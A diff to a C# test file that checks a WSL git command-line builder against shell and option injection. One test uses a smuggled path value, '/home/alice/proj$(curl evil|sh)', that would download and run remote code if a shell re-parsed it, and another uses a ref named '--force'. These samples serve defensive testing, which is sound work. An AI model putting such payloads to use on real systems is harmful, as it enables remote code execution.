@@ -41,21 +41,31 @@ public class GitServiceInjectionTests
         "a\nb",
     };
 
+    /// <summary>
+    /// The argv from `git` onwards — i.e. what the distro's git actually receives, ignoring
+    /// the wsl.exe preamble. Position-independent so a change to the preamble (there has
+    /// already been one) doesn't require rewriting every expectation.
+    /// </summary>
+    private static string[] GitArgv(string commandLine)
+    {
+        string[] argv = Win32CommandLineTests.Split(commandLine);
+        int g = argv.ToList().IndexOf("git");
+        Assert.True(g >= 0, "no `git` in: " + commandLine);
+        return argv[g..];
+    }
+
     [Theory]
     [MemberData(nameof(HostilePayloads))]
     public void WslGitCommandLine_KeepsEachValueAsExactlyOneArgument(string payload)
     {
         string cmd = GitService.BuildWslGitCommandLine(
             "Ubuntu", "/home/alice/repo",
-            new[] { "worktree", "add", "-b", payload, "/home/alice/wt" });
+            new[] { "worktree", "add", "-b", payload, "--", "/home/alice/wt" });
 
-        string[] argv = Win32CommandLineTests.Split(cmd);
-
-        // -d Ubuntu -e git -C /home/alice/repo worktree add -b <payload> /home/alice/wt
         Assert.Equal(
-            new[] { "-d", "Ubuntu", "-e", "git", "-C", "/home/alice/repo",
-                    "worktree", "add", "-b", payload, "/home/alice/wt" },
-            argv);
+            new[] { "git", "-C", "/home/alice/repo",
+                    "worktree", "add", "-b", payload, "--", "/home/alice/wt" },
+            GitArgv(cmd));
     }
 
     [Theory]
@@ -75,17 +85,69 @@ public class GitServiceInjectionTests
     [Fact]
     public void WslGitCommandLine_UsesDashE_NotDashDash()
     {
-        // The whole fix. `--` hands the tail to the distro's login shell; `-e` execs git
-        // directly. If this ever regresses, every payload above becomes live again.
+        // The whole fix. `--` hands the tail to the distro's login shell; `-e` execs the
+        // named program directly. If this regresses, every payload above becomes live again.
         string cmd = GitService.BuildWslGitCommandLine(
             "Ubuntu", "/repo", new[] { "status", "--porcelain" });
 
         string[] argv = Win32CommandLineTests.Split(cmd);
 
-        Assert.Contains("-e", argv);
-        Assert.DoesNotContain("--", argv);
-        // -e must come immediately before the program it execs.
-        Assert.Equal("git", argv[argv.ToList().IndexOf("-e") + 1]);
+        Assert.Equal("-e", argv[2]);
+        // No bare `--` may appear in the wsl.exe option section (before the program).
+        Assert.DoesNotContain("--", argv[..argv.ToList().IndexOf("git")]);
+    }
+
+    [Fact]
+    public void WslGitCommandLine_RunsGitThroughALoginShellWithoutReparsingArguments()
+    {
+        // A bare `-e git` is injection-safe but drops the login shell, so PATH is the bare
+        // default and anyone whose git comes from nix/asdf/linuxbrew silently loses WSL git
+        // (symptom: "not a git repo"). The old `--` form did run a login shell.
+        //
+        // `-e sh -lc 'exec "$0" "$@"' git …` gets the login PATH back safely: the script is
+        // a FIXED LITERAL and every untrusted value arrives as a positional parameter, which
+        // "$0"/"$@" expand verbatim without re-parsing.
+        string cmd = GitService.BuildWslGitCommandLine(
+            "Ubuntu", "/repo", new[] { "status" });
+
+        string[] argv = Win32CommandLineTests.Split(cmd);
+        int e = argv.ToList().IndexOf("-e");
+
+        Assert.Equal("sh", argv[e + 1]);
+        Assert.Equal("-lc", argv[e + 2]);
+        // The script must contain no interpolated data — only positional expansion.
+        Assert.Equal("exec \"$0\" \"$@\"", argv[e + 3]);
+        Assert.Equal("git", argv[e + 4]);
+    }
+
+    [Theory]
+    [MemberData(nameof(HostilePayloads))]
+    public void TheShellScriptIsAlwaysTheSameLiteral(string payload)
+    {
+        // The safety of the -lc form rests entirely on the script never varying with input.
+        string cmd = GitService.BuildWslGitCommandLine(
+            "Ubuntu", payload, new[] { "worktree", "add", "-b", payload, "--", payload });
+
+        string[] argv = Win32CommandLineTests.Split(cmd);
+
+        Assert.Single(argv, a => a == "exec \"$0\" \"$@\"");
+        Assert.Equal("exec \"$0\" \"$@\"", argv[argv.ToList().IndexOf("-lc") + 1]);
+    }
+
+    [Fact]
+    public void WorktreeAdd_TerminatesOptionParsingBeforePositionals()
+    {
+        // git uses permuting parse_options, so a ref legitimately named `--force` sitting in
+        // refs/heads would otherwise be consumed as an option rather than a commit-ish.
+        string cmd = GitService.BuildLocalGitCommandLine(
+            @"C:\repo", new[] { "worktree", "add", "--", @"C:\wt", "--force" });
+
+        string[] argv = Win32CommandLineTests.Split(cmd);
+
+        int dashDash = argv.ToList().IndexOf("--");
+        int hostileRef = argv.ToList().IndexOf("--force");
+        Assert.True(dashDash >= 0 && dashDash < hostileRef,
+            "the option terminator must precede any repo-controlled positional");
     }
 
     [Fact]
@@ -97,10 +159,9 @@ public class GitServiceInjectionTests
         string cmd = GitService.BuildWslGitCommandLine(
             "Ubuntu", "/home/alice/proj$(curl evil|sh)", new[] { "status", "--porcelain" });
 
-        string[] argv = Win32CommandLineTests.Split(cmd);
-
-        Assert.Equal("/home/alice/proj$(curl evil|sh)", argv[5]);
-        Assert.Equal(new[] { "status", "--porcelain" }, argv[6..]);
+        Assert.Equal(
+            new[] { "git", "-C", "/home/alice/proj$(curl evil|sh)", "status", "--porcelain" },
+            GitArgv(cmd));
     }
 
     [Fact]
@@ -121,8 +182,9 @@ public class GitServiceInjectionTests
         string cmd = GitService.BuildWslGitCommandLine(
             "Ubuntu", "/repo", new[] { "for-each-ref", "--format=%(refname:short)", "refs/heads" });
 
-        string[] argv = Win32CommandLineTests.Split(cmd);
-        Assert.Equal("--format=%(refname:short)", argv[7]);
+        Assert.Equal(
+            new[] { "git", "-C", "/repo", "for-each-ref", "--format=%(refname:short)", "refs/heads" },
+            GitArgv(cmd));
     }
 
     [Fact]
